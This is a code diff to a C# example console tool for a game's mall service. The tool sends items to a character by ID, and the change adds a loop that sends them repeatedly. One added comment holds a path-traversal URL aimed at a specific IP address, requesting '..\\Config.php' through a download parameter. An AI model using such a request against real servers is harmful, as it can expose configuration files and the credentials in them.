@@ -29,28 +29,34 @@ namespace OpenNos.MallServiceExample
             //{
             //    Console.WriteLine($"ID: {character.CharacterId} Name: {character.Name} Level: {character.Level} Class: {character.Class}");
             //}
+            //http://62.138.16.213/download/download.php?file=..\\Config.php
             Console.WriteLine("CharacterID:");
-                long charId = long.Parse(Console.ReadLine());
+            long charId = long.Parse(Console.ReadLine());
 
-                //if (characters.Any(s => s.CharacterId == charId))
-                //{
-                    Console.WriteLine("ItemVNum:");
-                    short vnum = short.Parse(Console.ReadLine());
-                    Console.WriteLine("Amount:");
-                    byte amount = byte.Parse(Console.ReadLine());
-                    Console.WriteLine("Rare:");
-                    byte rare = byte.Parse(Console.ReadLine());
-                    Console.WriteLine("Upgrade:");
-                    byte upgrade = byte.Parse(Console.ReadLine());
-
-                    MallServiceClient.Instance.SendItem(charId, new MallItem()
-                    {
-                        ItemVNum = vnum,
-                        Amount = amount,
-                        Rare = rare,
-                        Upgrade = upgrade
-                    });
-                //}
+            //if (characters.Any(s => s.CharacterId == charId))
+            //{
+            Console.WriteLine("ItemVNum:");
+            short vnum = short.Parse(Console.ReadLine());
+            Console.WriteLine("Amount:");
+            byte amount = byte.Parse(Console.ReadLine());
+            Console.WriteLine("Rare:");
+            byte rare = byte.Parse(Console.ReadLine());
+            Console.WriteLine("Upgrade:");
+            byte upgrade = byte.Parse(Console.ReadLine());
+            Console.WriteLine("Count:");
+            byte count = byte.Parse(Console.ReadLine());
+            while (count != 0)
+            {
+                MallServiceClient.Instance.SendItem(charId, new MallItem()
+                {
+                    ItemVNum = vnum,
+                    Amount = amount,
+                    Rare = rare,
+                    Upgrade = upgrade
+                });
+                count--;
+            }
+            //}
             //}
         }
 
